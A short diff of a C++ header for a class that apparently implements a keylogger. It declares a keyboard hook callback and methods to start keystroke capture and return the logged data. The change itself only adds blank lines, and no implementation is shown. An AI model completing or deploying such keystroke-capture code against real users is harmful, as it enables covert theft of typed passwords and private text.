@@ -16,8 +16,10 @@ class KLG_Func
 	static bool keylogging;
 public:
 	
+	
 	friend LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
 
+	
 	std::shared_ptr<DataObj> keylogger();
 	static void KeylogThreadFunc(std::string& res);
 	std::shared_ptr<DataObj> startKeylog();
